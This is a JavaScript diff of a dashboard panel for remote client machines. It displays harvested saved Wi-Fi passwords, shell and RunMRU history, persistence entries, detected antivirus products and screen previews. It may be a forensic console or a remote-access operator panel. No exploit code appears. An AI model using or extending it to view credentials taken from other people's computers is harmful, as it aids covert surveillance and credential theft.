@@ -13,6 +13,12 @@ function escapeHtml(text) {
   return div.innerHTML;
 }
 
+function isMicrosoft(str) {
+  if (!str) return false;
+  str = str.toLowerCase();
+  return str.includes('microsoft') || str.includes('windows\\system32') || str.includes('windows defender');
+}
+
 function countryToFlag(code) {
   if (!code || code === "ZZ") return '<span class="fi fi-xx"></span>';
   return `<span class="fi fi-${code.toLowerCase()}"></span>`;
@@ -41,20 +47,66 @@ function shortId(id) {
   return id.length > 8 ? id.substring(0, 8) : id;
 }
 
-function infoSection(title, icon, items) {
+function infoSection(title, icon, items, suffixBadge = "") {
   return `
-    <div class="info-section">
-      <div class="info-section-title">
-        <i class="${icon}"></i>
-        <span>${escapeHtml(title)}</span>
+    <div class="info-section bg-slate-900 border border-white/5 rounded-xl overflow-hidden shadow-lg hover:border-slate-600/50 transition-colors h-full flex flex-col min-w-0">
+      <div class="info-section-title flex items-center gap-2 px-4 py-3 bg-slate-800/80 border-b border-white/5 text-slate-200 font-semibold text-sm">
+        <i class="${icon} text-blue-400 w-4 text-center"></i>
+        <span>${escapeHtml(title)}</span> ${suffixBadge}
       </div>
-      <div class="info-section-body">
+      <div class="info-section-body flex-1 overflow-y-auto max-h-[300px] p-4 custom-scrollbar space-y-2">
         ${items.map(item => `
-          <div class="info-row">
-            <span class="info-row-label">${escapeHtml(item.label)}</span>
-            <span class="info-row-value">${item.value}</span>
+          <div class="info-row flex items-start justify-between px-3 py-2 gap-4 bg-slate-950/50 hover:bg-slate-800/80 border border-white/5 rounded transition-colors group min-w-0 ${item.classes || ''}" ${item.attrs || ''}>
+            <span class="info-row-label text-xs text-slate-400 whitespace-nowrap min-w-[100px] flex-shrink-0 group-hover:text-slate-300 transition-colors truncate min-w-0" title="${escapeHtml(item.label.replace(/<[^>]*>?/gm, ''))}">${item.label}</span>
+            <span class="info-row-value text-xs text-slate-200 text-right truncate min-w-0" title="${escapeHtml(item.value.replace(/<[^>]*>?/gm, ''))}">${item.value}</span>
           </div>
         `).join("")}
+      </div>
+    </div>
+  `;
+}
+
+function verboseInfoSection(title, icon, items, suffixBadge = "") {
+  return `
+    <div class="info-section bg-slate-900 border border-white/5 rounded-xl overflow-hidden shadow-lg hover:border-slate-600/50 transition-colors h-full flex flex-col min-w-0">
+      <div class="info-section-title flex items-center gap-2 px-4 py-3 bg-slate-800/80 border-b border-white/5 text-slate-200 font-semibold text-sm">
+        <i class="${icon} text-purple-400 w-4 text-center"></i>
+        <span>${escapeHtml(title)}</span> ${suffixBadge}
+      </div>
+      <div class="info-section-body flex-1 overflow-y-auto max-h-[350px] p-4 custom-scrollbar space-y-3">
+        ${items.map(item => `
+          <div class="flex flex-col px-3 py-2 bg-slate-950/50 hover:bg-slate-800/80 border border-white/5 rounded transition-colors group min-w-0">
+            <div class="text-xs font-bold text-slate-200 group-hover:text-white transition-colors truncate min-w-0" title="${escapeHtml(item.top)}">${escapeHtml(item.top)}</div>
+            <div class="text-[10px] text-slate-400 font-mono mt-1.5 leading-relaxed whitespace-pre-wrap break-words">${item.bottom}</div>
+          </div>
+        `).join("")}
+      </div>
+    </div>
+  `;
+}
+
+function tableSection(title, icon, headers, rows, suffixBadge = "") {
+  return `
+    <div class="info-section bg-slate-900 border border-white/5 rounded-xl overflow-hidden shadow-lg hover:border-slate-600/50 transition-colors h-full flex flex-col min-w-0">
+      <div class="info-section-title flex items-center gap-2 px-4 py-3 bg-slate-800/80 border-b border-white/5 text-slate-200 font-semibold text-sm">
+        <i class="${icon} text-emerald-400 w-4 text-center"></i>
+        <span>${escapeHtml(title)}</span> ${suffixBadge}
+      </div>
+      <div class="info-section-body flex-1 overflow-x-auto p-4 custom-scrollbar">
+        <table class="w-full text-left border-collapse min-w-0">
+          <thead>
+            <tr class="border-b border-white/5 text-slate-400 text-[10px] uppercase tracking-wider">
+              ${headers.map(h => `<th class="px-2 py-2 font-bold">${escapeHtml(h)}</th>`).join('')}
+            </tr>
+          </thead>
+          <tbody class="text-xs text-slate-200 divide-y divide-white/5">
+            ${rows.map(row => `
+              <tr class="hover:bg-slate-800/30 transition-colors">
+                ${row.map(cell => `<td class="px-2 py-2 truncate max-w-[150px]" title="${escapeHtml(String(cell).replace(/<[^>]*>?/gm, ''))}">${cell}</td>`).join('')}
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>
       </div>
     </div>
   `;
@@ -70,6 +122,7 @@ async function loadClientInfo() {
       return;
     }
     const data = await res.json();
+    window.__clientData = data;
     renderPanel(data);
   } catch (err) {
     console.error("Failed to load client info:", err);
@@ -107,6 +160,26 @@ function renderPanel(client) {
   // Preview thumbnail
   renderPreview(client);
 
+  // Init charts
+  initCharts();
+
+  // Init modal logic
+  initModalLogic();
+
+  // Copy IP listener
+  const copyBtn = document.getElementById("copy-ip-btn");
+  if (copyBtn) {
+    copyBtn.onclick = () => {
+      const ip = client.publicIp || client.ip || "";
+      navigator.clipboard.writeText(ip);
+      const span = document.getElementById("copy-ip-text");
+      if (span) {
+        span.textContent = "Copied!";
+        setTimeout(() => span.textContent = "Copy IP", 2000);
+      }
+    };
+  }
+
   // Main info grid
   renderInfoGrid(client);
 
@@ -117,6 +190,60 @@ function renderPanel(client) {
     stopResourcePolling();
     resetGauges();
   }
+}
+
+function initModalLogic() {
+  const modal = document.getElementById('forensic-modal');
+  const modalBox = document.getElementById('forensic-modal-box');
+  const closeBtn = document.getElementById('forensic-modal-close');
+  
+  if (!modal || !closeBtn) return;
+
+  closeBtn.onclick = () => {
+    modal.classList.add('opacity-0', 'pointer-events-none');
+    modalBox.classList.add('scale-95');
+    modalBox.classList.remove('scale-100');
+  };
+
+  // Close on backdrop click (optional but good UX)
+  modal.onclick = (e) => {
+    if (e.target === modal) {
+      closeBtn.onclick();
+    }
+  };
+
+  // Ensure window-level listener exists for dynamically inserted data-forensic items
+  document.addEventListener('click', (e) => {
+    const forensicRow = e.target.closest('[data-forensic]');
+    if (forensicRow && modal) {
+      const artifactType = forensicRow.getAttribute('data-forensic');
+      openForensicModal(artifactType);
+    }
+  });
+}
+
+function openForensicModal(type) {
+  const modal = document.getElementById('forensic-modal');
+  const modalBox = document.getElementById('forensic-modal-box');
+  const title = document.getElementById('forensic-modal-title');
+  const content = document.getElementById('forensic-modal-content');
+
+  const data = window.__forensicData || {};
+
+  if (type === 'ps_history') {
+    title.textContent = 'Console / Shell History Log';
+    content.textContent = data.ps_history && data.ps_history.trim() !== "" ? data.ps_history : 'No shell history records discovered on host.';
+  } else if (type === 'run_mru') {
+    title.textContent = 'RunMRU Cached Commands';
+    content.textContent = data.run_mru && data.run_mru.trim() !== "" ? data.run_mru : 'No RunMRU commands logged.';
+  } else {
+    title.textContent = 'Unknown Artifact';
+    content.textContent = 'No data payload mapped.';
+  }
+
+  modal.classList.remove('opacity-0', 'pointer-events-none');
+  modalBox.classList.remove('scale-95');
+  modalBox.classList.add('scale-100');
 }
 
 function renderQuickInfo(client) {
@@ -193,11 +320,21 @@ function renderInfoGrid(client) {
     { label: "Elevation", value: client.elevation ? `<span class="pill pill-ghost">${escapeHtml(client.elevation)}</span>` : '<span class="text-slate-500">Unknown</span>' },
   ]));
 
+  // ── Antivirus Products ───────────────────────────────────────────────────
+  const avItems = [];
+  if (client.antivirus) {
+    avItems.push({ label: "Primary AV", value: escapeHtml(client.antivirus) });
+  } else if (window.__lastData && window.__lastData.antivirus_products && window.__lastData.antivirus_products.length > 0) {
+    window.__lastData.antivirus_products.forEach((av, i) => {
+       avItems.push({ label: `Detected Engine ${i+1}`, value: escapeHtml(av) });
+    });
+  } else {
+    avItems.push({ label: "Status", value: '<span class="text-slate-500 italic">Scanning...</span>' });
+  }
+  items.push(`<div id="av-widget-container" class="h-full min-w-0">${infoSection("Antivirus Products", "fa-solid fa-shield-virus", avItems)}</div>`);
+
   // ── Security ─────────────────────────────────────────────────────────────
   const securityItems = [];
-  if (client.antivirus) {
-    securityItems.push({ label: "Antivirus", value: escapeHtml(client.antivirus) });
-  }
   if (client.firewall !== undefined) {
     securityItems.push({ label: "Firewall", value: client.firewall ? '<span class="text-emerald-400"><i class="fa-solid fa-shield-halved"></i> Enabled</span>' : '<span class="text-red-400"><i class="fa-solid fa-shield-halved"></i> Disabled</span>' });
   }
@@ -214,15 +351,6 @@ function renderInfoGrid(client) {
     items.push(infoSection("Security", "fa-solid fa-shield-halved", securityItems));
   }
 
-  // ── Saved Wi-Fi ──────────────────────────────────────────────────────────
-  if (client.wifiProfiles && client.wifiProfiles.length > 0) {
-    items.push(infoSection("Saved Wi-Fi Networks", "fa-solid fa-wifi",
-      client.wifiProfiles.map(w => ({
-        label: escapeHtml(w.ssid),
-        value: `<code class="text-xs">${escapeHtml(w.password || "N/A")}</code>`
-      }))
-    ));
-  }
 
   // ── Local Users ──────────────────────────────────────────────────────────
   if (client.localUsers && client.localUsers.length > 0) {
@@ -247,9 +375,46 @@ function renderInfoGrid(client) {
   grid.innerHTML = items.join("");
 }
 
-// ── Resource usage polling (every 7s via HTTP) ──────────────────────────────
+// ── Resource usage polling & Charts ─────────────────────────────────────────
 let resourceInterval = null;
 let resourceFetching = false;
+
+let cpuChart = null;
+let ramChart = null;
+const chartDataLength = 60;
+
+function initCharts() {
+  const commonOptions = {
+    responsive: true,
+    maintainAspectRatio: false,
+    animation: { duration: 400, easing: 'linear' },
+    scales: {
+      x: { display: false },
+      y: { min: 0, max: 100, display: true, beginAtZero: true, grid: { color: 'rgba(51, 65, 85, 0.3)' }, border: { dash: [4, 4] }, ticks: { color: '#64748b', stepSize: 25 } }
+    },
+    plugins: { legend: { display: false }, tooltip: { enabled: false } },
+    elements: { point: { radius: 0 }, line: { tension: 0.4, borderWidth: 2 } },
+    interaction: { mode: 'index', intersect: false }
+  };
+
+  const cpuCtx = document.getElementById('cpu-chart');
+  if (cpuCtx && !cpuChart) {
+    cpuChart = new Chart(cpuCtx, {
+      type: 'line',
+      data: { labels: Array(chartDataLength).fill(''), datasets: [{ data: Array(chartDataLength).fill(0), borderColor: '#3b82f6', backgroundColor: 'rgba(59, 130, 246, 0.15)', fill: true }] },
+      options: commonOptions
+    });
+  }
+
+  const ramCtx = document.getElementById('ram-chart');
+  if (ramCtx && !ramChart) {
+    ramChart = new Chart(ramCtx, {
+      type: 'line',
+      data: { labels: Array(chartDataLength).fill(''), datasets: [{ data: Array(chartDataLength).fill(0), borderColor: '#a855f7', backgroundColor: 'rgba(168, 85, 247, 0.15)', fill: true }] },
+      options: commonOptions
+    });
+  }
+}
 
 function startResourcePolling() {
   if (resourceInterval) return;
@@ -332,99 +497,143 @@ async function fetchResourceUsage() {
 }
 
 function updateGauges(data) {
-  const cpu = data.cpu_usage ?? 0;
-  const ram = data.ram_usage ?? 0;
-  const disk = data.disk_usage ?? 0;
+  window.__clientData = { ...(window.__clientData || {}), ...data };
+  const mergedData = window.__clientData;
+
+  const cpu = mergedData.cpu_usage ?? 0;
+  const ram = mergedData.ram_usage ?? 0;
+  const disk = mergedData.disk_usage ?? 0;
 
   // CPU
-  document.getElementById("gauge-cpu").textContent = `${Math.round(cpu)}%`;
-  document.getElementById("gauge-cpu-bar").style.width = `${cpu}%`;
-  document.getElementById("gauge-cpu-bar").className = `gauge-bar-fill ${getGaugeColorClass(cpu)}`;
+  const cpuEl = document.getElementById("gauge-cpu");
+  if(cpuEl) cpuEl.textContent = `${Math.round(cpu)}%`;
+  if (cpuChart) {
+    cpuChart.data.datasets[0].data.shift();
+    cpuChart.data.datasets[0].data.push(cpu);
+    cpuChart.update();
+  }
 
   // RAM
-  document.getElementById("gauge-ram").textContent = `${Math.round(ram)}%`;
-  document.getElementById("gauge-ram-bar").style.width = `${ram}%`;
-  document.getElementById("gauge-ram-bar").className = `gauge-bar-fill ${getGaugeColorClass(ram)}`;
+  const ramEl = document.getElementById("gauge-ram");
+  if(ramEl) ramEl.textContent = `${Math.round(ram)}%`;
   if (data.ram_used && data.ram_total) {
-    document.getElementById("gauge-ram-detail").textContent = `${data.ram_used} / ${data.ram_total}`;
+    const ramDet = document.getElementById("gauge-ram-detail");
+    if(ramDet) ramDet.textContent = `${data.ram_used} / ${data.ram_total}`;
+  }
+  if (ramChart) {
+    ramChart.data.datasets[0].data.shift();
+    ramChart.data.datasets[0].data.push(ram);
+    ramChart.update();
   }
 
   // Disk
-  document.getElementById("gauge-disk").textContent = `${Math.round(disk)}%`;
-  document.getElementById("gauge-disk-bar").style.width = `${disk}%`;
-  document.getElementById("gauge-disk-bar").className = `gauge-bar-fill ${getGaugeColorClass(disk)}`;
-  if (data.disk_used && data.disk_total) {
-    document.getElementById("gauge-disk-detail").textContent = `${data.disk_used} / ${data.disk_total}`;
+  const diskEl = document.getElementById("gauge-disk");
+  if(diskEl) diskEl.textContent = `${Math.round(disk)}%`;
+  const diskBar = document.getElementById("gauge-disk-bar");
+  if (diskBar) {
+    diskBar.style.width = `${disk}%`;
+    diskBar.className = `h-full rounded-full transition-all duration-500 ${disk >= 90 ? 'bg-red-500' : disk >= 75 ? 'bg-orange-500' : 'bg-amber-500'}`;
+  }
+  if (mergedData.disk_used && mergedData.disk_total) {
+    const diskDet = document.getElementById("gauge-disk-detail");
+    if(diskDet) diskDet.textContent = `${mergedData.disk_used} / ${mergedData.disk_total}`;
+  }
+
+  // Update AV Widget dynamically
+  const avContainer = document.getElementById("av-widget-container");
+  if (avContainer && mergedData.antivirus_products) {
+    if (mergedData.antivirus_products.length > 0) {
+      const avList = mergedData.antivirus_products.map(av => ({
+        label: escapeHtml(av),
+        value: '<span class="text-emerald-400 font-bold bg-emerald-900/40 px-2 py-0.5 rounded border border-emerald-800/50">Detected</span>'
+      }));
+      avContainer.innerHTML = infoSection("Antivirus Products", "fa-solid fa-shield-virus", avList);
+    }
   }
 
   // Extended info sections
-  renderExtendedInfo(data);
+  renderExtendedInfo(mergedData);
 }
 
 function renderExtendedInfo(data) {
+  window.__lastData = data;
   const container = document.getElementById("panel-extended-info");
   if (!container) return;
 
   // ── Persistence Region ─────────────────────────────────────────────────
   const persistenceSections = [];
+  const msBadge = '<span class="bg-purple-900/50 text-purple-300 text-[9px] px-1.5 py-0.5 rounded ml-2 border border-purple-800/50 uppercase tracking-wider font-bold">MS Hidden</span>';
 
   if (data.scheduled_tasks && data.scheduled_tasks.length > 0) {
-    persistenceSections.push(infoSection(
-      `Scheduled Tasks (${data.scheduled_tasks.length})`,
-      "fa-solid fa-clock",
-      data.scheduled_tasks.slice(0, 20).map(t => ({
-        label: escapeHtml(t.name || ""),
-        value: `<span class="text-xs">${escapeHtml(t.state || "")} • ${escapeHtml(t.next_run || "—")} • ${escapeHtml(t.command || "")}</span>`
-      }))
-    ));
+    const origCount = data.scheduled_tasks.length;
+    let filtered = data.scheduled_tasks.filter(t => !isMicrosoft(t.name) && !isMicrosoft(t.command));
+    let badge = origCount !== filtered.length ? msBadge : "";
+    if (filtered.length > 0 || origCount > 0) {
+      if (filtered.length === 0) filtered = [{name: "All filtered", command: "No non-Microsoft entries", state: "-", next_run: "-"}];
+      persistenceSections.push(verboseInfoSection(
+        `Scheduled Tasks (${filtered.length})`,
+        "fa-solid fa-clock",
+        filtered.slice(0, 20).map(t => ({
+          top: t.name || "",
+          bottom: t.command === "No non-Microsoft entries" ? `<span class="text-xs text-slate-500">None</span>` : `State: <span class="text-slate-300">${escapeHtml(t.state || "")}</span> | Next Run: <span class="text-slate-300">${escapeHtml(t.next_run || "—")}</span>\nCommand: <span class="text-emerald-300">${escapeHtml(t.command || "")}</span>`
+        })),
+        badge
+      ));
+    }
   }
 
   if (data.registry_persistence && data.registry_persistence.length > 0) {
-    persistenceSections.push(infoSection(
-      `Registry Persistence (${data.registry_persistence.length})`,
-      "fa-solid fa-database",
-      data.registry_persistence.slice(0, 20).map(r => ({
-        label: escapeHtml(r.key || ""),
-        value: `<span class="text-xs">${escapeHtml(r.name || "")} = ${escapeHtml(r.value || "")}</span>`
-      }))
-    ));
+    const origCount = data.registry_persistence.length;
+    let filtered = data.registry_persistence.filter(r => !isMicrosoft(r.name) && !isMicrosoft(r.value));
+    let badge = origCount !== filtered.length ? msBadge : "";
+    if (filtered.length > 0 || origCount > 0) {
+      if (filtered.length === 0) filtered = [{key: "All filtered", value: "No non-Microsoft entries", name: "-"}];
+      persistenceSections.push(verboseInfoSection(
+        `Registry Persistence (${filtered.length})`,
+        "fa-solid fa-database",
+        filtered.slice(0, 20).map(r => ({
+          top: r.key || r.name || "",
+          bottom: r.value === "No non-Microsoft entries" ? `<span class="text-xs text-slate-500">None</span>` : `Name: <span class="text-slate-300">${escapeHtml(r.name || "")}</span>\nTarget: <span class="text-emerald-300">${escapeHtml(r.value || "")}</span>`
+        })),
+        badge
+      ));
+    }
   }
 
   if (data.startup_programs && data.startup_programs.length > 0) {
-    persistenceSections.push(infoSection(
-      `Startup Programs (${data.startup_programs.length})`,
-      "fa-solid fa-power-off",
-      data.startup_programs.slice(0, 20).map(s => ({
-        label: escapeHtml(s.name || ""),
-        value: `<span class="text-xs">${escapeHtml(s.location || "")} • ${escapeHtml(s.path || "")}</span>`
-      }))
-    ));
+    const origCount = data.startup_programs.length;
+    let filtered = data.startup_programs.filter(s => !isMicrosoft(s.name) && !isMicrosoft(s.path));
+    let badge = origCount !== filtered.length ? msBadge : "";
+    if (filtered.length > 0 || origCount > 0) {
+      if (filtered.length === 0) filtered = [{name: "All filtered", path: "No non-Microsoft entries", location: "-"}];
+      persistenceSections.push(verboseInfoSection(
+        `Startup Programs (${filtered.length})`,
+        "fa-solid fa-power-off",
+        filtered.slice(0, 20).map(s => ({
+          top: s.name || "",
+          bottom: s.path === "No non-Microsoft entries" ? `<span class="text-xs text-slate-500">None</span>` : `Location: <span class="text-slate-300">${escapeHtml(s.location || "")}</span>\nPath: <span class="text-emerald-300">${escapeHtml(s.path || "")}</span>`
+        })),
+        badge
+      ));
+    }
   }
 
   // ── System Region ──────────────────────────────────────────────────────
   const systemSections = [];
 
   if (data.running_services && data.running_services.length > 0) {
-    systemSections.push(infoSection(
+    systemSections.push(verboseInfoSection(
       `Running Services (${data.running_services.length})`,
       "fa-solid fa-gears",
       data.running_services.slice(0, 20).map(s => ({
-        label: escapeHtml(s.display_name || s.name || ""),
-        value: `<span class="text-xs">${escapeHtml(s.state || "")} • ${escapeHtml(s.start_mode || "")}</span>`
+        top: s.display_name || s.name || "",
+        bottom: `State: <span class="text-slate-300">${escapeHtml(s.state || "")}</span> | Mode: <span class="text-slate-300">${escapeHtml(s.start_mode || "")}</span>\nPath: <span class="text-emerald-300">${escapeHtml(s.path || "Unknown")}</span>`
       }))
     ));
   }
 
-  if (data.antivirus_products && data.antivirus_products.length > 0) {
-    systemSections.push(infoSection(
-      "Antivirus Products",
-      "fa-solid fa-shield-virus",
-      data.antivirus_products.map(a => ({
-        label: escapeHtml(a),
-        value: '<span class="text-emerald-400">Detected</span>'
-      }))
-    ));
-  }
+  // Now handled dynamically during `renderInfoGrid` or we can skip duplicating
+  // if (data.antivirus_products && data.antivirus_products.length > 0) { ... }
 
   if (data.logged_in_users && data.logged_in_users.length > 0) {
     systemSections.push(infoSection(
@@ -474,6 +683,8 @@ function renderExtendedInfo(data) {
         value: `<span class="text-xs">${w.password ? `<span class="text-emerald-400">${escapeHtml(w.password)}</span>` : '<span class="text-yellow-400">No password</span>'} • ${escapeHtml(w.security || "")}</span>`
       }))
     ));
+  } else {
+    wifiSections.push(`<div class="col-span-1 md:col-span-2 lg:col-span-3 text-slate-500 italic text-center p-4 border border-dashed border-white/10 rounded mt-4">No stored WiFi credentials found.</div>`);
   }
 
   // ── Linux/macOS Region ─────────────────────────────────────────────────
@@ -512,33 +723,44 @@ function renderExtendedInfo(data) {
     ));
   }
   if (data.launch_daemons && data.launch_daemons.length > 0) {
-    otherSections.push(infoSection(
+    otherSections.push(verboseInfoSection(
       `Launch Daemons (${data.launch_daemons.length})`,
       "fa-solid fa-rocket",
       data.launch_daemons.slice(0, 20).map(l => ({
-        label: escapeHtml(l.label || ""),
-        value: `<span class="text-xs">${escapeHtml(l.program || "")} • ${l.run_at_load ? "RunAtLoad" : ""}</span>`
+        top: l.label || "",
+        bottom: `Path: <span class="text-emerald-300">${escapeHtml(l.program || "")}</span>\nFlags: <span class="text-slate-300">${l.run_at_load ? "RunAtLoad " : ""}${l.keep_alive ? "KeepAlive" : ""}</span>`
       }))
     ));
   }
 
-  // Build the region layout
+  // Build the region layout using Tailwind wrappers
   let html = "";
 
+  const regionWrapper = (title, icon, sections) => `
+    <div class="extended-region bg-slate-900 border border-white/5 rounded-xl overflow-hidden shadow-lg mb-6 flex flex-col w-full min-w-0">
+      <div class="extended-region-title flex items-center gap-2 px-6 py-4 bg-slate-950 border-b border-white/5 text-slate-200 font-bold uppercase tracking-wider text-sm shadow-sm min-w-0">
+        <i class="${icon} text-blue-500 mr-1"></i> ${title}
+      </div>
+      <div class="extended-region-grid grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 p-6 min-w-0 w-full">
+        ${sections.join("")}
+      </div>
+    </div>
+  `;
+
   if (persistenceSections.length > 0) {
-    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-lock"></i> Persistence</div><div class="extended-region-grid">${persistenceSections.join("")}</div></div>`;
+    html += regionWrapper("Persistence", "fa-solid fa-lock", persistenceSections);
   }
   if (systemSections.length > 0) {
-    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-computer"></i> System</div><div class="extended-region-grid">${systemSections.join("")}</div></div>`;
+    html += regionWrapper("System", "fa-solid fa-computer", systemSections);
   }
   if (networkSections.length > 0) {
-    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-network-wired"></i> Network</div><div class="extended-region-grid">${networkSections.join("")}</div></div>`;
+    html += regionWrapper("Network", "fa-solid fa-network-wired", networkSections);
   }
   if (wifiSections.length > 0) {
-    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-wifi"></i> WiFi Credentials</div><div class="extended-region-grid">${wifiSections.join("")}</div></div>`;
+    html += regionWrapper("WiFi Credentials", "fa-solid fa-wifi", wifiSections);
   }
   if (otherSections.length > 0) {
-    html += `<div class="extended-region"><div class="extended-region-title"><i class="fa-solid fa-globe"></i> Other</div><div class="extended-region-grid">${otherSections.join("")}</div></div>`;
+    html += regionWrapper("Other", "fa-solid fa-globe", otherSections);
   }
 
   container.innerHTML = html;
